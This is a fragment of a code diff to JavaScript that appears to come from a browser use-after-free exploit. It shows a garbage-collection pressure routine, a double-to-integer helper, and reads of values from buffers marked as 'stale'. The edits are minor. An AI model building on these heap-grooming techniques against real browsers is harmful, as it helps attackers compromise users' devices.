@@ -59,7 +59,7 @@ function d2u(d)
 }
 
 // dgc attempts to trigger a garbage collection by allocating a large amount of memory
-var pressure = new Array(100 * 2);
+var pressure = new Array(100);
 dgc = function() {
  	for (var i = 0; i < pressure.length; i++) {
  		pressure[i] = new Uint32Array(0x10000);
@@ -173,8 +173,8 @@ for (var i = 0; i < 0x1000; i++){
 				
                        		
 				//alert("Pushed stale");
-				original_val = bufs[i][k];
-				original_val1 = bufs[i][k+1];
+				var original_val = bufs[i][k];
+				var original_val1 = bufs[i][k+1];
 				
 				dgc();
 				dgc();
